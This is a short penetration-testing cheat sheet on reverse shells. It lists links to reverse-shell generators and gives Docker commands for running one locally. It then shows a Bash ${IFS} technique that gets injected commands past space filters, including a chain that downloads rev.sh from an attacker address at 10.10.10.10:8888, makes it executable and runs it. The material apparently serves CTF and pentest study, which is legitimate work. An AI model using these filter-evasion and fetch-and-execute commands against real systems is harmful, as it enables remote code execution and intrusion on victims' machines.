!!! info ""

    #### sources

    - [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary)
    - [calc1f4r Rootme](https://github.com/calc1f4r/Rootme)
    - [Reverse Shells](https://reverse-shell.sh/)
    - [Online - Reverse Shell Generator](https://www.revshells.com/)
    - [ShutdownRepo/shellerator](https://github.com/ShutdownRepo/shellerator)
    - [0x00-0x00/ShellPop](https://github.com/0x00-0x00/ShellPop)
    - [cybervaca/ShellReverse](https://github.com/cybervaca/ShellReverse)
    - [pyminifier](https://liftoff.github.io/pyminifier/)
    - [xct/xc](https://github.com/xct/xc/)
    - [Reverse Shell Generator](https://weibell.github.io/reverse-shell-generator/)
    - [t0thkr1s/revshellgen](https://github.com/t0thkr1s/revshellgen)
    - [mthbernardes/rsg](https://github.com/mthbernardes/rsg)
    - [My Pentest Tools](https://tex2e.github.io/reverse-shell-generator/index.html)

!!! info ""
    
    #### 0dayctf
    
    [0dayctf](https://github.com/0dayCTF/reverse-shell-generator)

    ```shell
    wget https://github.com/0dayCTF/reverse-shell-generator/archive/refs/heads/main.zip
    unzip main.zip
    cd reverse-shell-generator-main
    docker build -t reverse_shell_generator .
    docker run -d -p 8090:80 reverse_shell_generator

    http://127.0.0.1:8090
    ```

!!! info ""

    #### Bash IFS - Reverse Shell - Burp Repeater - PHP

    - IFS Internal Field Separator
    - The special shell variable _IFS_ determines how Bash recognizes word boundaries while splitting a sequence of character strings.
    - The default value of _IFS_ is a three-character string comprising a space, tab, and newline

    ```shell
    ls${IFS}-la
    ping${IFS}127.0.0.1
    wget${IFS}http://10.10.10.10:8888/rev.sh
    chmod${IFS}777{IFS}rev.sh
    bash${IFS}rev.sh
    ```
